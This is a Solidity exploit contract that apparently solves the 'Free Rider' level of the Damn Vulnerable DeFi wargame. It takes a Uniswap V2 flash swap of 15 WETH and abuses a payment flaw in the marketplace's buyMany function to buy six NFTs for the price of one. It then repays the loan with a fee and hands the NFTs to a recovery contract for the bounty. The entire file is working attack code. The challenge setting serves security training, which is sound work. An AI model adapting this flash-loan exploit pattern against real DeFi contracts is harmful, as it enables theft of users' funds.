//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "./FreeRiderNFTMarketplace.sol";
import "solmate/src/tokens/WETH.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public uPair;
    FreeRiderNFTMarketplace public marketplace;
    FreeRiderRecovery public recovery;
    WETH public wEth;
    DamnValuableNFT public nft;

    address public player;
    uint public amount = 15 ether;
    uint[] public tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uPair,
        address payable _marketplace,
        address _recovery,
        address payable _wEth,
        address _nft
    ) payable {
        uPair = IUniswapV2Pair(_uPair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = FreeRiderRecovery(_recovery);
        wEth = WETH(_wEth);
        nft = DamnValuableNFT(_nft);
        player = msg.sender;
    }

    function attack() public {
        //flashSwap from UniswapV2Pair
        bytes memory encodedAmount = abi.encode(amount);
        uPair.swap(amount, uint(0), address(this), encodedAmount);

        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, data);
        }
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) external {
        wEth.withdraw(amount0);
        marketplace.buyMany{value: amount0}(tokens);
        uint amount0Adjusted = (amount0 * 103) / 100;
        wEth.deposit{value: amount0Adjusted}();
        wEth.transfer(msg.sender, amount0Adjusted);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}